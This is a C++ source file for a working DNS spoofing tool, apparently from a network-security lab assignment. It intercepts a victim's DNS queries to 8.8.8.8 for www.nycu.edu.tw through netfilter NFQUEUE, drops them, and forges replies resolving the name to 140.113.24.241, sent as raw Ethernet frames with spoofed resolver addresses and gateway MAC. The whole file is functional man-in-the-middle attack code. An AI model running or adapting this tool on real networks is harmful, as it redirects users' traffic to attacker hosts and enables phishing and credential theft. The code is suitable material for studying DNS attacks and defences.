#include <cstdint>
#ifndef NF_DROP
# define NF_DROP   0
# define NF_ACCEPT 1
#endif

#include <cstring>
#include <string>
#include <iostream>
#include <fstream>

#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <libnetfilter_queue/libnetfilter_queue.h>

constexpr uint32_t TARGET_DNS_IP = 0x08080808;          // 8.8.8.8
constexpr char     SPOOF_IP[]    = "140.113.24.241";
constexpr char     QNAME[]       = "www.nycu.edu.tw.";

uint8_t victim_mac[6];
uint8_t gw_mac[6];
char    g_iface[IFNAMSIZ];

struct DnsHdr { 
    uint16_t id;
    uint16_t flags;
    uint16_t qd;
    uint16_t an;
    uint16_t ns;
    uint16_t ar;
} __attribute__((packed));

static uint16_t csum(const void* d, size_t len, uint32_t sum = 0){
    const uint16_t* p = static_cast<const uint16_t*>(d);
    while (len > 1) { 
        sum += *p++; len -= 2; 
    }
    if (len) sum += *reinterpret_cast<const uint8_t*>(p);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

static uint16_t udp_cksum(const iphdr* ip, const udphdr* udp, const uint8_t* pl, size_t len) {
    struct { 
        uint32_t s, d; 
        uint8_t z, p; 
        uint16_t l; 
    } ps{};
    ps.s = ip->saddr;              /* 8.8.8.8 (src) */
    ps.d = ip->daddr;              /* victim  (dst) */
    ps.z = 0;
    ps.p = IPPROTO_UDP;
    ps.l = htons(sizeof(udphdr) + len);

    uint32_t sum = csum(&ps, sizeof(ps));
    sum = csum(udp, sizeof(udphdr), sum);
    return csum(pl, len, sum);
}
static std::string qname_to_str(const uint8_t* q) {
    std::string s;
    while (*q) { int n = *q++; s.append((char*)q, n); q += n; if (*q) s+='.'; }
    s.push_back('.');
    return s;
}

static bool parse_mac(const char* s, uint8_t m[6]) {
    return sscanf(s,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6;
}

static void forge_reply(const uint8_t* pkt, int pklen) {
    /* original headers ------------------------------------------------- */
    const auto* ip   = reinterpret_cast<const iphdr*>(pkt);
    const auto* udp  = reinterpret_cast<const udphdr*>(pkt + ip->ihl * 4);
    const uint8_t* dns = pkt + ip->ihl * 4 + sizeof(udphdr);
    size_t dns_len = pklen - (ip->ihl * 4) - sizeof(udphdr);

    uint8_t dns_buf[512]{};

    const uint8_t* qn = dns + sizeof(DnsHdr);
    while (*qn) qn += *qn + 1;
    qn += 1 + 4;                      
    size_t qlen = qn - dns;           
    memcpy(dns_buf, dns, qlen);

    /* locate OPT RR in original query ---------------------------------- */
    const uint8_t* opt_ptr = qn;      // first byte of OPT
    uint16_t opt_len = ntohs(*(uint16_t*)(opt_ptr + 9)) + 11;  // full OPT size

    auto* dh = reinterpret_cast<DnsHdr*>(dns_buf);
    bool rd = ntohs(dh->flags) & 0x0100;
    dh->flags = htons(0x8000 | 0x0080 | (rd ? 0x0100 : 0));    // QR=1, RA=1
    dh->an = htons(1);
    dh->ar = htons(1);                // keep one additional (OPT)

    /* ---------- append forged Answer A 140.113.24.241 -------------- */
    uint8_t* p = dns_buf + qlen;
    *p++ = 0xC0; *p++ = 0x0C;         // name ptr → offset 0x0c
    *(uint16_t*)p = htons(1); p+=2;   // TYPE A
    *(uint16_t*)p = htons(1); p+=2;   // CLASS IN
    *(uint32_t*)p = htonl(60); p+=4;  // TTL
    *(uint16_t*)p = htons(4);  p+=2;  // RDLEN
    inet_pton(AF_INET, SPOOF_IP, p); p+=4;

    /* ---------- append the OPT RR (unaltered) ---------------------- */
    memcpy(p, opt_ptr, opt_len);
    p += opt_len;

    size_t dnsl = p - dns_buf;        // final DNS length

    /* ---------- build IP + UDP --------------------------------------- */
    uint8_t ipudp[sizeof(iphdr) + sizeof(udphdr) + 512]{};
    auto* ip2  = reinterpret_cast<iphdr*>(ipudp);
    auto* udp2 = reinterpret_cast<udphdr*>(ipudp + sizeof(iphdr));

    ip2->ihl     = 5;
    ip2->version = 4;
    ip2->ttl     = 64;
    ip2->protocol= IPPROTO_UDP;
    ip2->saddr   = ip->daddr;         // 8.8.8.8
    ip2->daddr   = ip->saddr;         // victim
    ip2->tot_len = htons(sizeof(iphdr) + sizeof(udphdr) + dnsl);
    ip2->check   = csum(ip2, sizeof(iphdr));

    udp2->source = htons(53);
    udp2->dest   = udp->source;
    udp2->len    = htons(sizeof(udphdr) + dnsl);
    memcpy(ipudp + sizeof(iphdr) + sizeof(udphdr), dns_buf, dnsl);

    uint16_t ck = udp_cksum(ip2, udp2,
                    ipudp + sizeof(iphdr) + sizeof(udphdr), dnsl);
    udp2->check = 0;

    /* ---------- wrap Ethernet & send via PF_PACKET ------------------- */
    uint8_t frame[14 + sizeof(ipudp)];
    auto* eth = reinterpret_cast<ether_header*>(frame);
    memcpy(eth->ether_dhost, victim_mac, 6);
    memcpy(eth->ether_shost, gw_mac, 6);
    eth->ether_type = htons(ETH_P_IP);

    size_t ipudp_len = sizeof(iphdr) + sizeof(udphdr) + dnsl;
    memcpy(frame + 14, ipudp, ipudp_len);

    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd < 0) { perror("socket"); return; }

    struct ifreq ifr{}; strncpy(ifr.ifr_name, g_iface, IFNAMSIZ);
    if (ioctl(sd, SIOCGIFINDEX, &ifr) != 0) { perror("ioctl"); close(sd); return; }

    struct sockaddr_ll sll{};
    sll.sll_family  = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_halen   = ETH_ALEN;
    memcpy(sll.sll_addr, victim_mac, 6);

    sendto(sd, frame, 14 + ipudp_len, 0,
           reinterpret_cast<sockaddr*>(&sll), sizeof(sll));
    close(sd);
}

/* ---------- NFQUEUE callback ---------- */
static int cb(nfq_q_handle* qh, nfgenmsg*, nfq_data* nfa, void*)
{
    uint32_t id = 0;
    if (auto* ph = nfq_get_msg_packet_hdr(nfa)) id = ntohl(ph->packet_id);

    unsigned char* data; int len = nfq_get_payload(nfa, &data);
    if (len > 0) {
        auto* ip  = reinterpret_cast<iphdr*>(data);
        if (ip->protocol == IPPROTO_UDP && ip->daddr == htonl(TARGET_DNS_IP)) {
            auto* udp = reinterpret_cast<udphdr*>(data + ip->ihl * 4);
            if (ntohs(udp->dest) == 53) {
                std::string q = qname_to_str(
                    data + ip->ihl*4 + sizeof(udphdr) + sizeof(DnsHdr));
                if (q == QNAME) {
                    std::cout << "[+] spoof " << q << " -> " << SPOOF_IP << '\n';
                    forge_reply(data, len);
                    return nfq_set_verdict(qh, id, NF_DROP, 0, nullptr);
                }
            }
        }
    }
    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
}

/* ---------------- main ---------------- */
int main(int argc, char* argv[])
{
    // if (argc != 4) {
    //     std::cerr << "usage: " << argv[0]
    //               << " <iface> <victim-mac> <gateway-mac>\n";
    //     return 1;
    // }
    // strncpy(g_iface, argv[1], IFNAMSIZ);
    // if (!parse_mac(argv[2], victim_mac) || !parse_mac(argv[3], gw_mac)) {
    //     std::cerr << "MAC parse error\n"; return 1;
    // }
    std::ifstream mac_file("a.txt");
    if (!mac_file) {
        std::cerr << "Failed to open a.txt\n";
        return 1;
    }

    std::string victim_str, gateway_str, iface_str;
    if (!std::getline(mac_file, victim_str) || !std::getline(mac_file, gateway_str) || !std::getline(mac_file, iface_str)) {
        std::cerr << "Failed to read lines from a.txt\n";
        return 1;
    }

    if (!parse_mac(victim_str.c_str(), victim_mac) || !parse_mac(gateway_str.c_str(), gw_mac)) {
        std::cerr << "MAC parse error in a.txt\n";
        return 1;
    }
    strncpy(g_iface, iface_str.c_str(), IFNAMSIZ);
    nfq_handle* h = nfq_open();  if (!h){ perror("nfq_open"); return 1; }
    nfq_unbind_pf(h, AF_INET); nfq_bind_pf(h, AF_INET);
    nfq_q_handle* q = nfq_create_queue(h, 1, &cb, nullptr);
    nfq_set_mode(q, NFQNL_COPY_PACKET, 0xFFFF);

    int fd = nfq_fd(h);
    std::cout << "[*] waiting DNS …\n";

    char buf[4096] __attribute__((aligned));
    while (int r = recv(fd, buf, sizeof(buf), 0))
        if (r>0) nfq_handle_packet(h, buf, r);
}

